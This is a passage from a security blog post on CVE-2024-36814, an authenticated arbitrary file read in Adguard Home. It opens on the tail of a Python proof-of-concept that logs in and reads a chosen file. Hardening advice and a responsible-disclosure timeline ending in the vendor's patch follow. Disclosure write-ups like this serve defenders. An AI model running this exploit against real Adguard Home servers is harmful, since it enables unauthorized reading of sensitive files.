    <span class="n">event_handler</span> <span class="o">=</span> <span class="nc">NewFileHandler</span><span class="p">()</span>
    <span class="n">observer</span> <span class="o">=</span> <span class="nc">Observer</span><span class="p">()</span>
    <span class="n">observer</span><span class="p">.</span><span class="nf">schedule</span><span class="p">(</span><span class="n">event_handler</span><span class="p">,</span> <span class="n">directory</span><span class="p">,</span> <span class="n">recursive</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">observer</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Watching directory: </span><span class="si">{</span><span class="n">directory</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">cookie</span> <span class="o">=</span> <span class="nf">authenticate</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
      <span class="nf">arb_read</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
      <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
      <span class="n">observer</span><span class="p">.</span><span class="nf">stop</span><span class="p">()</span>
    <span class="n">observer</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
  <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">"</span><span class="s">Make an HTTP POST request with JSON payload</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">url</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">URL to make the POST request to</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Username for authentication</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Password for authentication</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">directory</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Directory to watch for new files</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">file</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">File you want</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>

  <span class="nf">setup</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">directory</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="nb">file</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="good-practice"><span class="me-2">Good practice</span><a href="#good-practice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>There are several issues here that allowed this exploitation chain. Preventing any one of them would have made this exploit significantly harder if not impossible.</p>

<ol>
  <li>Implementing an allowlist of directories that files can be read from. This would prevent any potentially sensitive files from being read by validating and restricting the paths provided.</li>
  <li>Implementing adequate file permissions, by preventing unprivileged users from reading any copied files. This would prevent any user from reading the now copied files in the <code class="language-plaintext highlighter-rouge">/opt/AdguardHome</code> directory.</li>
  <li>Implementing the ability to “drop root”. This would allow Adguard Home to start up as root, bind to the privileged port, and drop its privileges after.</li>
  <li>Implement the <code class="language-plaintext highlighter-rouge">CAP_NET_BIND_SERVICE</code> capability by default. This would allow Adguard Home to start up as a low privileged user and bind to any privileged port. Although there seems to be a lot of arguments for and against <a href="https://news.ycombinator.com/item?id=32669838">this</a> so ¯\<em>(ツ)</em>/¯</li>
</ol>

<h2 id="disclosure-timeline"><span class="me-2">Disclosure timeline</span><a href="#disclosure-timeline" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li>05/04/2024: Adguard Home Authenticated Arbitrary File Read Discovered</li>
  <li>06/04/2024: Adguard Home Authenticated Arbitrary File Read Disclosed</li>
  <li>07/04/2024: Vendor acknowledges receipt of the disclosure</li>
  <li>24/04/2024: Vendor validates vulnerability disclosure and requests extended time frame to fix</li>
  <li>24/05/2024: Applied for MITRE CVE (with permission from the Adguard Home team)</li>
  <li>12/06/2024: Vendor provides fix for feedback</li>
  <li>08/06/2024: CVE-2024-36814 reserved</li>
  <li>05/07/2024: Tested vendor fix</li>
  <li>09/07/2024: Vendor asked for an extension due to windows causing issues</li>
  <li>04/10/2024: Vendor releases <a href="https://github.com/AdguardTeam/AdGuardHome/releases/tag/v0.107.53"><code class="language-plaintext highlighter-rouge">0.107.53</code></a> with patch for linux and mitigation for windows</li>
  <li>07/10/2024: Blog Post released</li>
</ul>

<h2 id="reporters"><span class="me-2">Reporters</span><a href="#reporters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li><a href="https://github.com/itz-d0dgy">Jack Moran (itz-d0dgy)</a></li>
</ul>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/cve/">CVE</a>,
          <a href="/categories/arbitrary-file-read/">Arbitrary File Read</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/DEADLOCK/">Deadlock SSRF to IP disclosure</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-36814/">CVE-2024-36814 - Adguard Home Arbitrary File Read</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-43801/">CVE-2024-43801 - Jellyfin XSS</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-41808/">CVE-2024-41808 - Unauthenticated log injection to account takeover</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-30931/">CVE-2024-30931 - Emby XSS</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->


















            </div>

            
              
              



  <section id="toc-wrapper" class="d-none ps-0 pe-4">
    <h2 class="panel-heading ps-3 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/CVE-2024-43801/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1725224400"
  data-df="ll"
  
>
  Sep  1, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-43801 - Jellyfin XSS</h4>
              <div class="text-muted">
                <p>Jellyfin XSS

TL;DR - Jellyfin deployments using versions 10.9.9 or lower are vulnerable to stored XSS which allowed privilege escalation to a platform administrator and ultimately to arbitrary cod...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/CVE-2024-41808/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1722805200"
  data-df="ll"
  
>
  Aug  4, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-41808 - Unauthenticated log injection to account takeover</h4>
              <div class="text-muted">
                <p>OpenObserve vulnerability chain

TL;DR - OpenObserve deployments using version 0.9.1 or lower are vulnerable to the following privilege escalation chain:

  A malicious user submits logs via a serv...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/CVE-2024-30931/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1718830800"
  data-df="ll"
  
>
  Jun 19, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-30931 - Emby XSS</h4>
              <div class="text-muted">
                <p>Emby Media Server XSS

TL;DR - Whilst playing with Emby Media Server 4.8.3.0, we found stored XSS and, due to other security configurations in the platform, we were able to craft a payload that res...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/CVE-2024-43801/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>CVE-2024-43801 - Jellyfin XSS</p>
    </a>
  

  
    <a
      href="/posts/DEADLOCK/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Deadlock SSRF to IP disclosure</p>
    </a>
  
</nav>

            
              
              <!-- The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2024</time>

    
      <a href="https://github.com/happy-little-accidents">happy-little-accidents</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.0.1"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->


















    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->
    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js"></script>






<script src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  







    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  <!-- Cloudflare Pages Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "5a0d6439923d4c8582697636643f8128"}'></script><!-- Cloudflare Pages Analytics --></body>
</html>

